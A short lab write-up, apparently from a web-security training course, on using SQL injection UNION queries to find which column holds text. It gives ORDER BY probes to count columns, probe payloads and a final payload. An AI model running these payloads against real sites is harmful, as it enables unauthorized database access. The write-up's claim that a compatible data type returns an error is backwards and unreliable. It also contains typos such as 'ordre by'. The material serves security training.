# Finding a column containing text

Just like previous lab here we are going to use **UNION** 
attack but to find text given to us

example query

```sql
' union select 'a',null,null,null--
' union select null,'a',null,null--
' union select null,null,'a',null--
' union select null,null,null,'a'--
```

if the data type is compatible with the injected string , it will return error

end goal: to find a text conatining column

but first we need to find total number of columns here

```sql
' order by 1--
' order by 2--
' ordre by 3--
```

here we have three colummn in which second column contains text , so now time for our payload

payload

```sql
' union select null, 'OOpujD', null--
```
